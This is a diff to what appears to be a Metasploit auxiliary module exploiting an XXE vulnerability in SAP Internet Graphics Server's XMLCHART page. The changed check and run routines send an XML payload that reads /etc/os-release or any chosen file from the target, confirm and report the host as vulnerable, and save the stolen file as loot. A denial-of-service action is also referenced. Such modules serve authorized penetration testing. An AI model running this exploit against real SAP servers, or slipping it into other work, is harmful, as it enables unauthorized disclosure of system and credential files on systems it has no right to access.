@@ -168,19 +168,22 @@ class MetasploitModule < Msf::Auxiliary
     rescue StandardError => e
       print_error("Failed to retrieve SAP IGS page at #{@schema}#{@host}:#{@port}#{@path}")
       vprint_error("Error #{e.class}: #{e}")
-      return nil
+      return -1
     end
 
     # Check first HTTP response
-    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/).nil?
-      print_error('The SAP IGS server did not respond to the first HTTP request in the expected manner!')
-      return nil
+    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/)
+      return -2
+    end
+
+    if first_response.body.include?('Errors')
+      return -3
     end
 
     first_response
   end
 
-  def analyze_first_response(html_response, _file_name)
+  def analyze_first_response(html_response)
     get_download_link(html_response)
     if !@download_link.to_s.empty?
 
@@ -213,60 +216,70 @@ class MetasploitModule < Msf::Auxiliary
 
   def check
 
+    # Set up variables
+    os_release = ''
+    os_release_file = '/etc/os-release'
+
     # Set up XML data for HTTP request
     setup_xml_and_variables
-    make_post_data('/etc/os-release', false) # Create a XML data payload to retrieve the value of /etc/os-release
+    make_post_data(os_release_file, false) # Create a XML data payload to retrieve the value of /etc/os-release
     # so that the module can check if the target is vulnerable or not.
 
     # Get OS release information
     check_response = send_first_request
-    if check_response.nil?
-      return Exploit::CheckCode::Safe
-    end
-
-    os_release = ''
-    result = analyze_first_response(check_response.body, '/etc/os-release')
-
-    # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.
-    if result == -1 || result == -3
-      Exploit::CheckCode::Safe('The server did not respond to the second request in the expected manner and is therefore safe')
-    elsif result == -2
-      Exploit::CheckCode::Unknown('Some connection error occured and it was not possible to determine if the server is vulnerable or not')
-    end
-
-    if !@file_content.to_s.empty?
-      if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*"(?<os>.*)"$/))
-        os_release = "OS info: #{os_regex[:os]}"
+    if check_response == -1
+      Exploit::CheckCode::Safe('The server encountered an exception when trying to respond to the first request and did not respond in the expected manner.')
+    elsif check_response == -2
+      Exploit::CheckCode::Safe('The server encountered an exception when trying to respond to the first request and did not respond in the expected manner.')
+    else
+      if check_response == -3
+        vprint_status("The SAP IGS server is vulnerable, but file: #{os_release_file} not found or not enough rights.")
       else
-        return Exploit::CheckCode::Safe("#{@host} did not return the contents of the requested file, aka /etc/os-release. This host is likely patched.")
+        result = analyze_first_response(check_response.body)
+
+        # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.
+        if result == -1 || result == -3
+          Exploit::CheckCode::Safe('The server did not respond to the second request in the expected manner and is therefore safe')
+        elsif result == -2
+          Exploit::CheckCode::Unknown('Some connection error occurred and it was not possible to determine if the server is vulnerable or not')
+        end
+
+        if !@file_content.to_s.empty?
+          if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*"(?<os>.*)"$/))
+            os_release = "OS: #{os_regex[:os]}"
+          end
+        else
+          return Exploit::CheckCode::Safe("#{@host} did not return the contents of the requested file, aka #{os_release_file}. This host is likely patched.")
+        end
+      end
+      # Make ident
+      if os_release != ''
+        ident = "SAP Internet Graphics Server (IGS); #{os_release}"
+      else
+        ident = 'SAP Internet Graphics Server (IGS)'
+      end
+      # Report Service and Vulnerability
+      report_service(
+        host: @host,
+        port: @port,
+        name: 'http',
+        proto: 'tcp',
+        info: ident
+      )
+      report_vuln(
+        host: @host,
+        port: @port,
+        name: name,
+        refs: references,
+        info: os_release
+      )
+      # Print Vulnerability
+      if os_release == ''
+        Exploit::CheckCode::Vulnerable("#{@host} returned a response indicating that its XMLCHART page is vulnerable to XXE!")
+      else
+        Exploit::CheckCode::Vulnerable("#{@host} running #{os_release} returned a response indicating that its XMLCHART page is vulnerable to XXE!")
       end
     end
-
-    if os_release != ''
-      ident = "SAP Internet Graphics Server (IGS); #{os_release}"
-    else
-      ident = 'SAP Internet Graphics Server (IGS)'
-    end
-
-    report_service(
-      host: @host,
-      port: @port,
-      name: 'http',
-      proto: 'tcp',
-      info: ident
-    )
-
-    # Report and print Vulnerability
-    report_vuln(
-      host: @host,
-      port: @port,
-      name: name,
-      refs: references,
-      info: os_release
-    )
-
-    Exploit::CheckCode::Vulnerable("#{@host} running #{os_release} returned a response indicating that its XMLCHART page is vulnerable to XXE!")
-
   end
 
   def run
@@ -288,27 +301,11 @@ class MetasploitModule < Msf::Auxiliary
 
     # Download remote file
     first_response = send_first_request
-    if first_response.nil?
-      fail_with(Failure::UnexpectedReply, 'The server did not respond to the first request in an expected manner.')
-    end
-
-    result = analyze_first_response(first_response.body, @file)
-    # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.
-    if result == -1
-      fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the second request and did not respond in the expected manner.')
-    elsif result == -2
-      print_error('The server responded successfully but the response indicated the server is not vulnerable!')
-      return
-    elsif result == -3
-      print_error('The server responded successfully but no download link was found in the response, so it is not vulnerable!')
-      return
-    end
-
-    if !@file_content.to_s.empty?
-      vprint_good("File: #{@file} content from host: #{@host}\n#{@file_content}")
-      loot = store_loot('sap.igs.xmlchart.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XMLCHART XXE')
-      print_good("File: #{@file} saved in: #{loot}")
-
+    if first_response == -1
+      fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the first request and did not respond in the expected manner.')
+    elsif first_response == -2
+      fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the first request and did not respond in the expected manner.')
+    else
       # Report Service and Vulnerability
       report_service(
         host: @host,
@@ -323,11 +320,32 @@ class MetasploitModule < Msf::Auxiliary
         name: name,
         refs: references
       )
+      # Get remote file content
+      if first_response == -3
+        print_status("The SAP IGS server is vulnerable, but file: #{@file} not found or not enough rights.")
+      else
+        result = analyze_first_response(first_response.body)
+        # Handle all the odd cases where analyze_first_response may not return a success code, aka a return value of 0.
+        if result == -1
+          fail_with(Failure::UnexpectedReply, 'The server encountered an exception when trying to respond to the second request and did not respond in the expected manner.')
+        elsif result == -2
+          print_error('The server responded successfully but the response indicated the server is not vulnerable!')
+          return
+        elsif result == -3
+          print_error('The server responded successfully but no download link was found in the response, so it is not vulnerable!')
+          return
+        end
 
-    else
-      fail_with(Failure::NotVulnerable, 'Could not retrieve the content of the target file!')
+        if !@file_content.to_s.empty?
+          vprint_good("File: #{@file} content from host: #{@host}\n#{@file_content}")
+          loot = store_loot('sap.igs.xmlchart.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XMLCHART XXE')
+          print_good("File: #{@file} saved in: #{loot}")
+        else
+          print_error("Failed to get #{@file} content!")
+        end
+
+      end
     end
-
   end
 
   def action_dos
